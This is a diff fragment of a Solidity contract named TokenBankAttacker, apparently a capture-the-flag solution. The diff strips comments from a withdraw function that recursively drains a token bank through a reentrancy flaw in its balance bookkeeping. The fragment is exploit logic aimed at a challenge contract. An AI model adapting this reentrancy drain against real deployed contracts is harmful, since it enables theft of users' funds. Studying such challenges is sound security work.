@@ -142,15 +142,11 @@ contract TokenBankAttacker {
     }
 
     function withdraw() public {
-        // this one is the bugged one, does not update after withdraw
         uint256 myInitialBalance = bankContract.balanceOf(address(this));
-        // this one from the token contract, updates after withdraw
         uint256 challengeTotalRemainingBalance = bankContract.token().balanceOf(address(bankContract));
-        // are there more tokens to empty?
         bool keepRecursing = challengeTotalRemainingBalance > 0;
 
         if (keepRecursing) {
-            // can only withdraw at most our initial balance per withdraw call
             uint256 toWithdraw = myInitialBalance < challengeTotalRemainingBalance
                 ? myInitialBalance
                 : challengeTotalRemainingBalance;
